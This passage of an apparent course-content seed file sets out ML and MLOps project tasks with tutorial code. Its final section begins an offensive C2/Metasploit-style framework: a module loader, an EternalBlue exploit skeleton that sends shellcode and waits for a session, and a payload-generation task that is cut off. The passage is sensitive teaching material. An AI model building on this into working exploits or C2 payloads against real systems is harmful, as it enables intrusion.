    loss = F.cross_entropy(
        outputs.logits.view(-1, outputs.logits.size(-1)),
        labels.view(-1),
        ignore_index=-100
    )
    return (loss, outputs) if return_outputs else loss

training_args = TrainingArguments(
    output_dir="./instruction-tuned",
    per_device_train_batch_size=4,
    gradient_accumulation_steps=4,
    learning_rate=2e-5,
    num_train_epochs=3,
    warmup_ratio=0.03,
    logging_steps=10,
    save_strategy="epoch",
)
\`\`\`

### Diverse Instructions
\`\`\`
Good instruction datasets include:
- Multiple task types (QA, summarization, translation, coding)
- Varying complexity
- Different output formats (short answer, paragraph, list)

Examples:
- "Write a Python function that..."
- "Explain the concept of..."
- "List 5 reasons why..."
- "Translate to Spanish: ..."
- "What is the sentiment of..."
\`\`\`

### Evaluation
\`\`\`python
# Test on held-out instructions
test_prompts = [
    "Write a haiku about programming.",
    "Explain quantum computing in simple terms.",
    "Convert this Python code to JavaScript: ..."
]

for prompt in test_prompts:
    response = generate(model, prompt)
    print(f"Prompt: {prompt}")
    print(f"Response: {response}\\n")
\`\`\`

## Completion Criteria
- [ ] Format instruction dataset
- [ ] Mask loss on instruction tokens
- [ ] Fine-tune model
- [ ] Evaluate instruction following`],
			]);
		} else if (p.name.includes('ML Pipeline') || p.name.includes('MLOps')) {
			let modId = getOrCreateModule(p.id, 'Data Pipeline', 'Data engineering', 20);
			addTasksToModule(modId, [
				['Build data ingestion', 'Pull data from multiple sources: S3, databases, APIs, streaming (Kafka). Handle batching, retries, schema validation. Apache Airflow or Prefect for orchestration.',
`## Data Ingestion Pipeline

### Multi-Source Ingestion
\`\`\`python
from prefect import flow, task
import boto3
import pandas as pd
from sqlalchemy import create_engine

@task(retries=3, retry_delay_seconds=60)
def ingest_from_s3(bucket, key):
    s3 = boto3.client('s3')
    obj = s3.get_object(Bucket=bucket, Key=key)
    return pd.read_parquet(obj['Body'])

@task(retries=3)
def ingest_from_database(connection_string, query):
    engine = create_engine(connection_string)
    return pd.read_sql(query, engine)

@task
def ingest_from_api(url, params):
    response = requests.get(url, params=params)
    response.raise_for_status()
    return pd.DataFrame(response.json()['data'])

@flow
def daily_ingestion():
    # Parallel ingestion from multiple sources
    s3_data = ingest_from_s3("bucket", "data/daily.parquet")
    db_data = ingest_from_database(DB_URL, "SELECT * FROM events WHERE date = CURRENT_DATE")
    api_data = ingest_from_api("https://api.example.com/data", {"date": today()})

    # Combine and validate
    combined = merge_sources(s3_data, db_data, api_data)
    return combined
\`\`\`

### Schema Validation
\`\`\`python
from pydantic import BaseModel, validator
from typing import Optional

class EventSchema(BaseModel):
    event_id: str
    user_id: str
    timestamp: datetime
    event_type: str
    value: Optional[float]

    @validator('event_type')
    def valid_event_type(cls, v):
        allowed = ['click', 'view', 'purchase']
        if v not in allowed:
            raise ValueError(f'event_type must be in {allowed}')
        return v

def validate_dataframe(df, schema):
    errors = []
    for idx, row in df.iterrows():
        try:
            schema(**row.to_dict())
        except ValidationError as e:
            errors.append((idx, e))
    return errors
\`\`\`

### Airflow DAG
\`\`\`python
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime, timedelta

default_args = {
    'retries': 3,
    'retry_delay': timedelta(minutes=5),
}

with DAG('ml_data_pipeline', default_args=default_args, schedule_interval='@daily') as dag:
    ingest = PythonOperator(task_id='ingest', python_callable=ingest_data)
    validate = PythonOperator(task_id='validate', python_callable=validate_data)
    transform = PythonOperator(task_id='transform', python_callable=transform_data)

    ingest >> validate >> transform
\`\`\`

## Completion Criteria
- [ ] Ingest from 3+ sources
- [ ] Handle retries and failures
- [ ] Validate schema on ingestion
- [ ] Orchestrate with Airflow/Prefect`],

				['Implement data validation', 'Use Great Expectations or similar: define expectations (column not null, values in range), run validation, fail pipeline on violations. Generate data quality reports.',
`## Data Validation

### Great Expectations Setup
\`\`\`python
import great_expectations as gx

# Initialize context
context = gx.get_context()

# Create expectation suite
suite = context.add_expectation_suite("training_data_suite")

# Add expectations
suite.add_expectation(
    gx.expectations.ExpectColumnValuesToNotBeNull(column="user_id")
)
suite.add_expectation(
    gx.expectations.ExpectColumnValuesToBeBetween(column="age", min_value=0, max_value=120)
)
suite.add_expectation(
    gx.expectations.ExpectColumnValuesToBeInSet(column="status", value_set=["active", "inactive"])
)
suite.add_expectation(
    gx.expectations.ExpectColumnMeanToBeBetween(column="purchase_amount", min_value=10, max_value=1000)
)
\`\`\`

### Run Validation
\`\`\`python
# Connect data source
datasource = context.sources.add_pandas("pandas_source")
data_asset = datasource.add_dataframe_asset("training_data")

# Create batch request
batch_request = data_asset.build_batch_request(dataframe=df)

# Validate
checkpoint = context.add_or_update_checkpoint(
    name="training_checkpoint",
    validations=[{
        "batch_request": batch_request,
        "expectation_suite_name": "training_data_suite"
    }]
)

results = checkpoint.run()

if not results.success:
    raise ValueError("Data validation failed!")
\`\`\`

### Custom Validation Functions
\`\`\`python
def validate_data_quality(df):
    checks = []

    # Null check
    null_pct = df.isnull().sum() / len(df)
    for col, pct in null_pct.items():
        if pct > 0.05:  # >5% nulls
            checks.append(f"Column {col} has {pct:.1%} nulls")

    # Duplicate check
    dup_pct = df.duplicated().sum() / len(df)
    if dup_pct > 0.01:
        checks.append(f"Dataset has {dup_pct:.1%} duplicates")

    # Distribution shift (compare to baseline)
    for col in numerical_cols:
        ks_stat, p_value = ks_2samp(df[col], baseline[col])
        if p_value < 0.05:
            checks.append(f"Column {col} distribution shifted (p={p_value:.4f})")

    if checks:
        raise DataQualityError("\\n".join(checks))
\`\`\`

### Generate Reports
\`\`\`python
# Great Expectations auto-generates HTML reports
context.build_data_docs()

# Custom summary
def generate_quality_report(df, results):
    report = {
        "timestamp": datetime.now().isoformat(),
        "row_count": len(df),
        "column_count": len(df.columns),
        "null_summary": df.isnull().sum().to_dict(),
        "validation_results": results.to_json_dict(),
    }
    return report
\`\`\`

## Completion Criteria
- [ ] Define expectation suite
- [ ] Run validation in pipeline
- [ ] Fail on violations
- [ ] Generate quality reports`],

				['Add feature engineering', 'Transform raw data into ML features: scaling, encoding categoricals, datetime extraction, aggregations. Use pandas, Spark, or dbt. Document feature logic.',
`## Feature Engineering

### Numerical Features
\`\`\`python
from sklearn.preprocessing import StandardScaler, MinMaxScaler

class NumericalTransformer:
    def __init__(self):
        self.scalers = {}

    def fit_transform(self, df, columns):
        result = df.copy()
        for col in columns:
            scaler = StandardScaler()
            result[f"{col}_scaled"] = scaler.fit_transform(df[[col]])
            self.scalers[col] = scaler

            # Also create log transform for skewed features
            if df[col].skew() > 1:
                result[f"{col}_log"] = np.log1p(df[col])

        return result

    def transform(self, df, columns):
        result = df.copy()
        for col in columns:
            result[f"{col}_scaled"] = self.scalers[col].transform(df[[col]])
            if f"{col}_log" in self.scalers:
                result[f"{col}_log"] = np.log1p(df[col])
        return result
\`\`\`

### Categorical Encoding
\`\`\`python
from sklearn.preprocessing import LabelEncoder, OneHotEncoder

def encode_categoricals(df, columns):
    result = df.copy()

    for col in columns:
        cardinality = df[col].nunique()

        if cardinality == 2:
            # Binary: label encode
            result[f"{col}_encoded"] = LabelEncoder().fit_transform(df[col])

        elif cardinality < 10:
            # Low cardinality: one-hot
            dummies = pd.get_dummies(df[col], prefix=col)
            result = pd.concat([result, dummies], axis=1)

        else:
            # High cardinality: target encoding
            target_means = df.groupby(col)['target'].mean()
            result[f"{col}_target_enc"] = df[col].map(target_means)

    return result
\`\`\`

### Datetime Features
\`\`\`python
def extract_datetime_features(df, col):
    df[f"{col}_year"] = df[col].dt.year
    df[f"{col}_month"] = df[col].dt.month
    df[f"{col}_day"] = df[col].dt.day
    df[f"{col}_dayofweek"] = df[col].dt.dayofweek
    df[f"{col}_hour"] = df[col].dt.hour
    df[f"{col}_is_weekend"] = df[col].dt.dayofweek >= 5

    # Cyclical encoding for periodic features
    df[f"{col}_month_sin"] = np.sin(2 * np.pi * df[col].dt.month / 12)
    df[f"{col}_month_cos"] = np.cos(2 * np.pi * df[col].dt.month / 12)

    return df
\`\`\`

### Aggregation Features
\`\`\`python
def create_aggregations(df, group_col, agg_col):
    aggs = df.groupby(group_col)[agg_col].agg(['mean', 'std', 'min', 'max', 'count'])
    aggs.columns = [f"{group_col}_{agg_col}_{stat}" for stat in aggs.columns]
    return df.merge(aggs, on=group_col, how='left')

# Example: user purchase statistics
df = create_aggregations(df, 'user_id', 'purchase_amount')
\`\`\`

## Completion Criteria
- [ ] Scale numerical features
- [ ] Encode categorical features
- [ ] Extract datetime features
- [ ] Create aggregations`],

				['Build feature store', 'Centralized feature repository (Feast, Tecton). Store feature definitions, compute and serve features consistently for training and inference. Avoid training-serving skew.',
`## Feature Store

### Feast Setup
\`\`\`python
# feature_repo/feature_definitions.py
from feast import Entity, Feature, FeatureView, FileSource
from feast.types import Float32, Int64

# Define entity
user = Entity(name="user_id", value_type=ValueType.INT64)

# Define data source
user_features_source = FileSource(
    path="data/user_features.parquet",
    timestamp_field="event_timestamp",
)

# Define feature view
user_features = FeatureView(
    name="user_features",
    entities=[user],
    ttl=timedelta(days=1),
    features=[
        Feature(name="age", dtype=Int64),
        Feature(name="total_purchases", dtype=Float32),
        Feature(name="avg_purchase_amount", dtype=Float32),
        Feature(name="days_since_last_purchase", dtype=Int64),
    ],
    source=user_features_source,
)
\`\`\`

### Materialize Features
\`\`\`bash
# Apply feature definitions
feast apply

# Materialize to online store (for real-time serving)
feast materialize-incremental $(date +%Y-%m-%dT%H:%M:%S)
\`\`\`

### Training Data Retrieval
\`\`\`python
from feast import FeatureStore

store = FeatureStore(repo_path="feature_repo/")

# Get historical features for training
entity_df = pd.DataFrame({
    "user_id": [1, 2, 3, 4, 5],
    "event_timestamp": [datetime(2024, 1, 1)] * 5
})

training_df = store.get_historical_features(
    entity_df=entity_df,
    features=[
        "user_features:age",
        "user_features:total_purchases",
        "user_features:avg_purchase_amount",
    ]
).to_df()
\`\`\`

### Online Serving
\`\`\`python
# Real-time feature retrieval
online_features = store.get_online_features(
    features=[
        "user_features:age",
        "user_features:total_purchases",
    ],
    entity_rows=[{"user_id": 12345}]
).to_dict()

# Use in prediction
prediction = model.predict(online_features)
\`\`\`

### Avoid Training-Serving Skew
\`\`\`
Problems:
- Different feature computation logic in training vs serving
- Different data sources
- Stale features in online store

Solutions:
1. Single source of truth for feature definitions
2. Same code path for training and serving
3. Monitor feature distributions in production
4. Automated feature freshness checks
\`\`\`

## Completion Criteria
- [ ] Define feature views
- [ ] Materialize to online store
- [ ] Retrieve features for training
- [ ] Serve features in real-time`],

				['Implement data versioning', 'Track dataset versions with DVC or Delta Lake. Link model version to exact training data. Enable reproducibility: checkout data version, retrain, get same model.',
`## Data Versioning

### DVC Setup
\`\`\`bash
# Initialize DVC
dvc init
git add .dvc .dvcignore
git commit -m "Initialize DVC"

# Configure remote storage
dvc remote add -d myremote s3://my-bucket/dvc-store
dvc remote modify myremote region us-east-1

# Track data files
dvc add data/training_data.parquet
git add data/training_data.parquet.dvc data/.gitignore
git commit -m "Add training data v1"

# Push data to remote
dvc push
\`\`\`

### Version Control Data
\`\`\`bash
# Update data and create new version
dvc add data/training_data.parquet
git add data/training_data.parquet.dvc
git commit -m "Update training data v2"
git tag data-v2
dvc push

# Switch to previous version
git checkout data-v1
dvc checkout
# Now have v1 data locally

# See data changes
dvc diff HEAD~1
\`\`\`

### Link Model to Data Version
\`\`\`python
import mlflow

# Start run with data version
data_version = subprocess.check_output(['git', 'log', '-1', '--format=%H', '--', 'data/training_data.parquet.dvc']).decode().strip()

with mlflow.start_run():
    mlflow.log_param("data_version", data_version)
    mlflow.log_param("data_commit", git_commit_hash)

    # Train model
    model = train(load_data())

    mlflow.sklearn.log_model(model, "model")

# Later: reproduce training
def reproduce_training(run_id):
    run = mlflow.get_run(run_id)
    data_version = run.data.params['data_version']

    # Checkout exact data version
    subprocess.run(['git', 'checkout', data_version, '--', 'data/'])
    subprocess.run(['dvc', 'checkout'])

    # Retrain
    model = train(load_data())
    return model
\`\`\`

### DVC Pipelines
\`\`\`yaml
# dvc.yaml - Define reproducible pipeline
stages:
  preprocess:
    cmd: python src/preprocess.py
    deps:
      - src/preprocess.py
      - data/raw/
    outs:
      - data/processed/

  train:
    cmd: python src/train.py
    deps:
      - src/train.py
      - data/processed/
    params:
      - train.learning_rate
      - train.epochs
    outs:
      - models/model.pkl
    metrics:
      - metrics.json:
          cache: false

# Run pipeline
dvc repro

# See pipeline status
dvc dag
\`\`\`

## Completion Criteria
- [ ] Set up DVC with remote storage
- [ ] Version training data
- [ ] Link model runs to data versions
- [ ] Create reproducible pipeline`],
			]);
			modId = getOrCreateModule(p.id, 'Model Management', 'MLOps workflow', 21);
			addTasksToModule(modId, [
				['Set up experiment tracking', 'Log hyperparameters, metrics, artifacts with MLflow. Compare runs, visualize learning curves. Tag best runs. Example: mlflow.log_param("lr", 0.001), mlflow.log_metric("accuracy", 0.95).',
`## Experiment Tracking

### MLflow Setup
\`\`\`python
import mlflow

# Set tracking URI
mlflow.set_tracking_uri("http://mlflow-server:5000")
mlflow.set_experiment("recommendation-model")

# Start experiment run
with mlflow.start_run(run_name="baseline_v1"):
    # Log parameters
    mlflow.log_param("learning_rate", 0.001)
    mlflow.log_param("batch_size", 32)
    mlflow.log_param("epochs", 10)
    mlflow.log_param("model_type", "transformer")

    # Training loop
    for epoch in range(epochs):
        train_loss = train_epoch(model, train_loader)
        val_loss, val_acc = evaluate(model, val_loader)

        # Log metrics
        mlflow.log_metric("train_loss", train_loss, step=epoch)
        mlflow.log_metric("val_loss", val_loss, step=epoch)
        mlflow.log_metric("val_accuracy", val_acc, step=epoch)

    # Log final metrics
    mlflow.log_metric("final_accuracy", val_acc)

    # Log model artifact
    mlflow.pytorch.log_model(model, "model")

    # Log other artifacts
    mlflow.log_artifact("training_config.yaml")
    mlflow.log_artifact("confusion_matrix.png")
\`\`\`

### Compare Experiments
\`\`\`python
# Search runs
runs = mlflow.search_runs(
    experiment_ids=["1"],
    filter_string="metrics.val_accuracy > 0.9",
    order_by=["metrics.val_accuracy DESC"]
)

# Get best run
best_run = runs.iloc[0]
print(f"Best accuracy: {best_run['metrics.val_accuracy']}")
print(f"Parameters: lr={best_run['params.learning_rate']}")

# Load model from best run
model = mlflow.pytorch.load_model(f"runs:/{best_run.run_id}/model")
\`\`\`

### Tagging and Organization
\`\`\`python
# Tag runs for easy filtering
with mlflow.start_run():
    mlflow.set_tag("team", "ml-platform")
    mlflow.set_tag("purpose", "production")
    mlflow.set_tag("data_version", "v2.3")

# Search by tags
runs = mlflow.search_runs(filter_string="tags.purpose = 'production'")
\`\`\`

## Completion Criteria
- [ ] Set up MLflow server
- [ ] Log params, metrics, artifacts
- [ ] Compare experiment runs
- [ ] Tag and organize experiments`],

				['Build model registry', 'Version models with metadata (metrics, training data version). Stages: None → Staging → Production → Archived. Approval workflow before production promotion.',
`## Model Registry

### Register Model
\`\`\`python
import mlflow
from mlflow.tracking import MlflowClient

client = MlflowClient()

# Register model from run
with mlflow.start_run() as run:
    mlflow.sklearn.log_model(model, "model", registered_model_name="recommendation-model")

# Or register existing run
model_uri = f"runs:/{run_id}/model"
mlflow.register_model(model_uri, "recommendation-model")
\`\`\`

### Model Versions and Stages
\`\`\`python
# Transition model to staging
client.transition_model_version_stage(
    name="recommendation-model",
    version=3,
    stage="Staging"
)

# After validation, promote to production
client.transition_model_version_stage(
    name="recommendation-model",
    version=3,
    stage="Production",
    archive_existing_versions=True  # Archive current production
)

# Load production model
model = mlflow.pyfunc.load_model("models:/recommendation-model/Production")
\`\`\`

### Model Metadata
\`\`\`python
# Add description and tags
client.update_registered_model(
    name="recommendation-model",
    description="User-item recommendation using collaborative filtering"
)

client.update_model_version(
    name="recommendation-model",
    version=3,
    description="Improved with attention mechanism"
)

client.set_model_version_tag(
    name="recommendation-model",
    version=3,
    key="training_data_version",
    value="v2.3"
)
\`\`\`

### Approval Workflow
\`\`\`python
def promote_to_production(model_name, version):
    # 1. Run validation tests
    model = mlflow.pyfunc.load_model(f"models:/{model_name}/{version}")
    metrics = run_validation(model, test_data)

    if metrics['accuracy'] < 0.95:
        raise ValueError(f"Model accuracy {metrics['accuracy']} below threshold")

    # 2. Get approval (could be manual or automated)
    if not get_approval(model_name, version, metrics):
        raise ValueError("Approval denied")

    # 3. Promote
    client.transition_model_version_stage(
        name=model_name,
        version=version,
        stage="Production",
        archive_existing_versions=True
    )

    # 4. Notify
    notify_team(f"Model {model_name} v{version} promoted to production")
\`\`\`

## Completion Criteria
- [ ] Register models with versions
- [ ] Implement staging workflow
- [ ] Add model metadata
- [ ] Create approval process`],

				['Implement CI/CD for ML', 'Trigger training on data/code changes. Run validation tests. Build container images. Deploy to staging, run integration tests, promote to production. GitHub Actions or Jenkins.',
`## ML CI/CD Pipeline

### GitHub Actions Workflow
\`\`\`yaml
# .github/workflows/ml-pipeline.yml
name: ML Pipeline
on:
  push:
    paths:
      - 'src/**'
      - 'data/**'
      - 'dvc.yaml'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run unit tests
        run: pytest tests/unit/

      - name: Run data validation
        run: python src/validate_data.py

  train:
    needs: test
    runs-on: [self-hosted, gpu]
    steps:
      - uses: actions/checkout@v3

      - name: Pull data
        run: dvc pull

      - name: Train model
        run: |
          python src/train.py \\
            --config configs/production.yaml \\
            --output models/

      - name: Evaluate model
        run: python src/evaluate.py --model models/model.pt

      - name: Register model
        if: github.ref == 'refs/heads/main'
        run: python src/register_model.py

  deploy-staging:
    needs: train
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - name: Build container
        run: docker build -t ml-service:\${{ github.sha }} .

      - name: Push to registry
        run: |
          docker tag ml-service:\${{ github.sha }} registry/ml-service:staging
          docker push registry/ml-service:staging

      - name: Deploy to staging
        run: kubectl apply -f k8s/staging/

      - name: Run integration tests
        run: python tests/integration/test_api.py --env staging

  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    steps:
      - name: Deploy to production
        run: |
          docker tag ml-service:\${{ github.sha }} registry/ml-service:production
          kubectl apply -f k8s/production/
\`\`\`

### Model Validation Tests
\`\`\`python
# tests/model/test_model.py
def test_model_accuracy():
    model = load_model("models/model.pt")
    metrics = evaluate(model, test_data)
    assert metrics['accuracy'] >= 0.95, f"Accuracy {metrics['accuracy']} below threshold"

def test_model_latency():
    model = load_model("models/model.pt")
    latencies = []
    for _ in range(100):
        start = time.time()
        model.predict(sample_input)
        latencies.append(time.time() - start)

    p99_latency = np.percentile(latencies, 99)
    assert p99_latency < 0.1, f"P99 latency {p99_latency}s exceeds 100ms"

def test_model_no_regression():
    new_model = load_model("models/model.pt")
    prod_model = load_production_model()

    new_metrics = evaluate(new_model, test_data)
    prod_metrics = evaluate(prod_model, test_data)

    assert new_metrics['accuracy'] >= prod_metrics['accuracy'] * 0.99
\`\`\`

## Completion Criteria
- [ ] Trigger training on changes
- [ ] Run validation tests
- [ ] Deploy to staging automatically
- [ ] Require approval for production`],

				['Add model monitoring', 'Track prediction distribution, input data drift (KS test, PSI), model performance on labeled data. Alert on drift threshold. Retrain trigger. Use Evidently AI or custom dashboards.',
`## Model Monitoring

### Evidently AI Setup
\`\`\`python
from evidently import ColumnMapping
from evidently.report import Report
from evidently.metric_preset import DataDriftPreset, TargetDriftPreset

# Define column mapping
column_mapping = ColumnMapping(
    target='label',
    prediction='prediction',
    numerical_features=['feature1', 'feature2'],
    categorical_features=['category']
)

# Create drift report
report = Report(metrics=[
    DataDriftPreset(),
    TargetDriftPreset(),
])

report.run(
    reference_data=training_data,
    current_data=production_data,
    column_mapping=column_mapping
)

# Save report
report.save_html("drift_report.html")

# Get drift metrics programmatically
drift_metrics = report.as_dict()
dataset_drift = drift_metrics['metrics'][0]['result']['dataset_drift']
\`\`\`

### Custom Drift Detection
\`\`\`python
from scipy.stats import ks_2samp
import numpy as np

def detect_drift(reference, current, threshold=0.05):
    drift_results = {}

    for column in reference.columns:
        if reference[column].dtype in ['float64', 'int64']:
            # KS test for numerical
            stat, p_value = ks_2samp(reference[column], current[column])
            drift_results[column] = {
                'statistic': stat,
                'p_value': p_value,
                'drifted': p_value < threshold
            }
        else:
            # PSI for categorical
            psi = calculate_psi(reference[column], current[column])
            drift_results[column] = {
                'psi': psi,
                'drifted': psi > 0.2  # >0.2 indicates significant drift
            }

    return drift_results

def calculate_psi(reference, current, bins=10):
    ref_pct = reference.value_counts(normalize=True)
    cur_pct = current.value_counts(normalize=True)
    psi = np.sum((cur_pct - ref_pct) * np.log(cur_pct / ref_pct))
    return psi
\`\`\`

### Performance Monitoring
\`\`\`python
import prometheus_client as prom

# Define metrics
prediction_latency = prom.Histogram(
    'model_prediction_latency_seconds',
    'Prediction latency',
    buckets=[0.01, 0.05, 0.1, 0.5, 1.0]
)

predictions_total = prom.Counter(
    'model_predictions_total',
    'Total predictions',
    ['model_version', 'prediction_class']
)

# Track predictions
@prediction_latency.time()
def predict(model, features):
    prediction = model.predict(features)
    predictions_total.labels(
        model_version=MODEL_VERSION,
        prediction_class=str(prediction)
    ).inc()
    return prediction
\`\`\`

### Alerting
\`\`\`python
def check_and_alert():
    drift = detect_drift(reference_data, current_data)

    drifted_features = [f for f, r in drift.items() if r['drifted']]

    if len(drifted_features) > 3:
        send_alert(
            severity="warning",
            message=f"Data drift detected in features: {drifted_features}",
            action="Consider retraining model"
        )

        # Optionally trigger retrain
        if len(drifted_features) > 5:
            trigger_retrain_pipeline()
\`\`\`

## Completion Criteria
- [ ] Track prediction distributions
- [ ] Detect data drift
- [ ] Monitor model performance
- [ ] Set up alerting and retrain triggers`],

				['Build A/B testing framework', 'Split traffic between model versions (e.g., 90/10). Track business metrics per variant. Statistical significance testing. Gradual rollout: 10% → 50% → 100%.',
`## A/B Testing Framework

### Traffic Splitting
\`\`\`python
import hashlib
import random

class ABRouter:
    def __init__(self, experiments):
        self.experiments = experiments

    def get_variant(self, user_id, experiment_name):
        exp = self.experiments[experiment_name]

        # Consistent hashing for same user = same variant
        hash_input = f"{user_id}:{experiment_name}"
        hash_value = int(hashlib.md5(hash_input.encode()).hexdigest(), 16)
        bucket = hash_value % 100

        cumulative = 0
        for variant, percentage in exp['variants'].items():
            cumulative += percentage
            if bucket < cumulative:
                return variant

        return exp['control']

# Configuration
experiments = {
    "model_v2_test": {
        "variants": {"control": 90, "treatment": 10},
        "control": "model_v1",
    }
}

router = ABRouter(experiments)
variant = router.get_variant(user_id, "model_v2_test")
\`\`\`

### Metrics Collection
\`\`\`python
from dataclasses import dataclass
from datetime import datetime

@dataclass
class ExperimentEvent:
    experiment: str
    variant: str
    user_id: str
    metric: str
    value: float
    timestamp: datetime

class MetricsCollector:
    def __init__(self, db):
        self.db = db

    def log_event(self, event: ExperimentEvent):
        self.db.insert('experiment_events', event.__dict__)

    def get_metrics(self, experiment, metric):
        return self.db.query('''
            SELECT variant, AVG(value) as mean, STDDEV(value) as std, COUNT(*) as n
            FROM experiment_events
            WHERE experiment = ? AND metric = ?
            GROUP BY variant
        ''', [experiment, metric])

# Usage in prediction service
collector.log_event(ExperimentEvent(
    experiment="model_v2_test",
    variant=variant,
    user_id=user_id,
    metric="click_through_rate",
    value=1.0 if clicked else 0.0,
    timestamp=datetime.now()
))
\`\`\`

### Statistical Analysis
\`\`\`python
from scipy import stats
import numpy as np

def analyze_experiment(control_data, treatment_data, alpha=0.05):
    # Two-sample t-test
    t_stat, p_value = stats.ttest_ind(control_data, treatment_data)

    # Effect size (Cohen's d)
    pooled_std = np.sqrt((np.std(control_data)**2 + np.std(treatment_data)**2) / 2)
    effect_size = (np.mean(treatment_data) - np.mean(control_data)) / pooled_std

    # Confidence interval for difference
    mean_diff = np.mean(treatment_data) - np.mean(control_data)
    se = np.sqrt(np.var(control_data)/len(control_data) + np.var(treatment_data)/len(treatment_data))
    ci = (mean_diff - 1.96*se, mean_diff + 1.96*se)

    return {
        'control_mean': np.mean(control_data),
        'treatment_mean': np.mean(treatment_data),
        'p_value': p_value,
        'significant': p_value < alpha,
        'effect_size': effect_size,
        'confidence_interval': ci,
        'lift': (np.mean(treatment_data) - np.mean(control_data)) / np.mean(control_data)
    }
\`\`\`

### Gradual Rollout
\`\`\`python
class GradualRollout:
    def __init__(self):
        self.current_percentage = 10

    def increase_rollout(self, experiment):
        results = analyze_experiment_data(experiment)

        if results['p_value'] > 0.05:
            # Not significant yet, wait for more data
            return

        if results['lift'] > 0:
            # Positive result, increase rollout
            self.current_percentage = min(self.current_percentage * 2, 100)
            update_experiment_config(experiment, self.current_percentage)

            if self.current_percentage == 100:
                # Fully rolled out, make permanent
                promote_model_to_production(experiment)
        else:
            # Negative result, stop experiment
            stop_experiment(experiment)
\`\`\`

## Completion Criteria
- [ ] Implement traffic splitting
- [ ] Track metrics per variant
- [ ] Run statistical tests
- [ ] Implement gradual rollout`],
			]);
		} else if (p.name.includes('Metasploit') || p.name.includes('C2') || p.name.includes('Cobalt')) {
			let modId = getOrCreateModule(p.id, 'Core Framework', 'Base implementation', 20);
			addTasksToModule(modId, [
				['Build module loader', 'Dynamically load exploit/payload modules at runtime. Plugin architecture with common interface. Module metadata: name, author, targets, options. Hot-reload during operation.',
`## Module Loader System

### Plugin Architecture
\`\`\`python
import importlib
import os
from abc import ABC, abstractmethod

class Module(ABC):
    """Base class for all modules"""
    name = ""
    author = ""
    description = ""
    options = {}

    @abstractmethod
    def run(self, options):
        pass

class ModuleLoader:
    def __init__(self, module_paths):
        self.modules = {}
        self.module_paths = module_paths

    def discover_modules(self):
        for path in self.module_paths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith('.py') and not file.startswith('_'):
                        module_path = os.path.join(root, file)
                        self.load_module(module_path)

    def load_module(self, path):
        spec = importlib.util.spec_from_file_location("module", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        # Find Module subclass
        for name, obj in vars(module).items():
            if isinstance(obj, type) and issubclass(obj, Module) and obj != Module:
                instance = obj()
                self.modules[instance.name] = instance
                return instance
\`\`\`

### Module Metadata
\`\`\`python
class ExploitModule(Module):
    name = "exploit/windows/smb/ms17_010"
    author = "security_researcher"
    description = "EternalBlue SMB Remote Code Execution"
    references = [
        "CVE-2017-0144",
        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"
    ]
    targets = [
        {"name": "Windows 7 SP1", "arch": "x64"},
        {"name": "Windows Server 2008 R2", "arch": "x64"},
    ]
    options = {
        "RHOSTS": {"required": True, "description": "Target IP"},
        "RPORT": {"required": True, "default": 445, "description": "SMB port"},
        "PAYLOAD": {"required": True, "description": "Payload module name"},
    }
\`\`\`

### Hot Reload
\`\`\`python
import watchdog.events
import watchdog.observers

class ModuleReloader(watchdog.events.FileSystemEventHandler):
    def __init__(self, loader):
        self.loader = loader

    def on_modified(self, event):
        if event.src_path.endswith('.py'):
            print(f"Reloading: {event.src_path}")
            self.loader.load_module(event.src_path)

# Watch for changes
observer = watchdog.observers.Observer()
observer.schedule(ModuleReloader(loader), module_path, recursive=True)
observer.start()
\`\`\`

## Completion Criteria
- [ ] Implement module base class
- [ ] Dynamic discovery and loading
- [ ] Module metadata system
- [ ] Hot reload on file changes`],

				['Implement exploit interface', 'Standard API for exploits: check() to test vulnerability, exploit() to execute, options for target/port/payload. Return session on success. Handle common patterns: connect, send, receive.',
`## Exploit Interface

### Standard API
\`\`\`python
from abc import abstractmethod
from enum import Enum

class ExploitResult(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    UNKNOWN = "unknown"

class Exploit(Module):
    @abstractmethod
    def check(self) -> ExploitResult:
        """Test if target is vulnerable without exploiting"""
        pass

    @abstractmethod
    def exploit(self) -> Session:
        """Execute exploit, return session on success"""
        pass

    def validate_options(self):
        for name, config in self.options.items():
            if config.get('required') and name not in self.current_options:
                raise ValueError(f"Required option {name} not set")
\`\`\`

### Example Exploit
\`\`\`python
class MS17_010(Exploit):
    name = "exploit/windows/smb/ms17_010"

    def check(self):
        sock = self.connect(self.options['RHOSTS'], self.options['RPORT'])
        try:
            # Send SMB negotiate
            sock.send(self.build_negotiate())
            response = sock.recv(1024)

            # Check for vulnerable signature
            if self.is_vulnerable(response):
                return ExploitResult.VULNERABLE
            return ExploitResult.NOT_VULNERABLE
        finally:
            sock.close()

    def exploit(self):
        if self.check() != ExploitResult.VULNERABLE:
            return None

        sock = self.connect(self.options['RHOSTS'], self.options['RPORT'])

        # Execute exploit chain
        self.negotiate(sock)
        self.session_setup(sock)
        self.tree_connect(sock)

        # Trigger vulnerability with shellcode
        payload = self.generate_payload()
        self.send_exploit(sock, payload)

        # Create session from callback
        session = self.handler.wait_for_session(timeout=30)
        return session
\`\`\`

### Connection Helpers
\`\`\`python
class NetworkMixin:
    def connect(self, host, port, timeout=10):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock

    def send_receive(self, sock, data, recv_size=4096):
        sock.send(data)
        return sock.recv(recv_size)

    def connect_ssl(self, host, port):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = socket.socket()
        return context.wrap_socket(sock, server_hostname=host)
\`\`\`

## Completion Criteria
- [ ] Define exploit interface
- [ ] Implement check() method
- [ ] Implement exploit() method
- [ ] Create connection helpers`],

				['Add payload generation', 'Generate payloads in multiple formats: raw shellcode, EXE, DLL, PowerShell, Python, VBA macro. Embed configuration (C2 address, sleep time). Cross-platform support.',
`## Payload Generation

### Payload Base
\`\`\`python
